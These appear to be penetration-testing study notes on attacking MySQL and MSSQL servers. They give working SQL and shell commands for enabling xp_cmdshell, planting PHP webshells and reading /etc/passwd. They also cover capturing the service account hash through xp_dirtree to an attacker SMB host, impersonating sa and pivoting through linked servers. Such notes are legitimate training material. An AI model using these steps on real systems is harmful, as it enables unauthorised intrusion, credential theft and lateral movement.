- MySQL and MSSQL are relational database management systems
	- Data is stored in tables, columns, and row
- Uses SQL for querying and maintaining the database.

## Enumeration
- Default Ports:
	- MSSQL - TCP/1433 and UDP/1434
		- MSSQL "hidden" mode - TCP/2433
	- MySQL - TCP/3306

#### Banner Grabbing
``` bash
 #MSSQL
 nmap -Pn -sV -sC -p1433 <IP>
# MySQL
nmap -Pn -sV -sC -p3306 <IP>
```


### Authentication Mechanisms
- MSSQL
	- Windows Authentication Mode (Default)
		- Integrated into Windows/Active Directory. Uses those permissions to grant access
	- Mixed mode
		- Same as above but also has usernames/passwords maintained within SQL Server.
- [MySQL](https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_connection_phase_authentication_methods.html)
	- Username/Password or Windows Authentication (with a plugin)

# Protocol Specific Attacks
#### MySQL - Connect to the SQL Server
``` bash
 mysql -u julio -pPassword123 -h <IP> 
```

#### Sqlcmd - Connect to the SQL Server
``` cmd
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```
- If we are targeting MSSQL from Linux we can use sqsh as an alternative to sqlcmd
``` bash
sqsh -S <IP> -U julio -P 'MyPassword!' -h
```
- We can also use Impacket `mssqlclient.py`
``` bash
mssqlclient.py -p 1433 julio@<IP>
```

- When using Windows Auth we **need** to specify the domain or hostname. 
	- If we don't then SQL Auth is assumed and it will auth against the users created in the SQL Server.
- If we are targetting a local account we can use `SERVERNAME\\accountname` or `.\\accountname`
	- Example: `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`

### SQL Default Databases
- MySQL:
	- `mysql` - system database that contains table that store info required by the MySQL server
	- `information_schema` - provides access to database metadata
	- `performance_schema` - feature for monitoring server execution at a low level
	- `sys` - stuff for admins and developers to interpret data collected by perf schema
- MSSQL:
	- `master` - keeps the information for an instance of SQL Server.
	- `msdb` - used my SQL Server Agent
	- `model` - a template database
	- `resource` - read only db that keeps system objects visible on every db on the server in sys schema
	- `tempdb` - keeps temp objects for SQL queries

## SQL Syntax
**MySql**:
``` mysql
SHOW DATABASES;
USE dbname;
SHOW TABLES;
SELECT * FROM users;
```

**MSSQL** via sqlcmd:
``` MSSQL
# Show Databases
SELECT name FROM master.dbo.sysdatabases
GO
# Select a database
USE dbname
GO
# Show Tables
SELECT table_name FROM dbname.INFORMATION_SCHEMA.TABLES
GO
# Select all data from table "users"
SELECT * FROM users
GO
```

#### Execute Commands
- In MSSQL we can use [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) to execute system commands.
	- This is disabled by default

``` mssql
xp_cmdshell 'whoami'
GO
```
- If `xp_cmdshell` is not enabled we can enable it if we have the appropriate privs:
``` mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```
- There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).

#### Write Local Files
- `MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. 
	- For example, suppose `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET. 
		- If we have the appropriate privileges, we can attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory.
		- Then we can browse to the location where the file is and execute our commands.
``` mysql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```
- In MySQL, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import/export operations. These options are only allowed by users with the FILE privilege.
- `secure_file_priv` may be set:
	- Empty - the variable has no effect which is not secure. We can do whatever.
	- Directory - The server limits imports/exports to files in that directory. The directory must exist; the server does not create it.
	- NULL - Server disables import/export
- To read it:
``` mysql
show variables like "secure_file_priv";
```

- To write files with MSSQL Ole Automation Procedures needs to be enabled
	- This requires admin privs and then executing some stored procedures
``` mssql
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
- MSSQL - Create a File
```
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### Read Local Files
- By default MSSQL allows file read on any file the account has read access to
``` mssql
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

- MySQL by default does not allow arbitrary file read but if the settings are in place this is how you would read a file
``` mysql
select LOAD_FILE("/etc/passwd");
```

## Capture MSSQL Service Hash
- We can steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` which are undocumented stored procedures which use SMB to retrive a list of directories.
	- When we use of those and point it at our SMB server, we can force the server to authenticate and send the NTLMv2 hash of the service account.

- First start Responder or impacket-smbserver and execute one of the following SQL queries
``` mssql
EXEC master..xp_dirtree '\\<ATTACKIP>\share\'
GO
##### OR
EXEC master..xp_subdirs '\\<ATTACKIP>\share\'
```

## Impersonate Existing Users with MSSQL
- SQL server has a permission named IMPERSONATE that allows the user to take on the permissions of another user or login until the context is reset or the session ends.

- First we need to find which users we can impersonate.
	- Sysadmins can impersonate anyone by default but for other privs must be explicitly assigned.
``` mssql
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

#### Verify our Current User and Role
``` mssql
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```
- The returned value 0 indicates that we do not have the sysadmin role but we can impersonate the sa user.
 - To impersonate:
 ``` mssql
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```
- It is recommended to run EXECUTE AS LOGIN within the master db because all users have access to it. 
	- To return to the previous user use `REVERT`
	- Non-sysadmin users may have access to other databases or linked servers.

### Communicate with Other Databases with MSSQL
- MSSQL has a configuration option called linked servers.
- If we gain access to a server with a linked server configured we may be able to move laterally to that server.

#### Identify linked Servers in MSSQL
``` mssql
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```
- `isremote` 0 means linked and 1 means remote.
- Next we can attempt to id the user used for the connection and its privileges.
	- `EXECUTE` can be used to send pass-through commands to linked servers.
	- The command goes between parantheses and the linked server between square brackets.
``` mssql
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```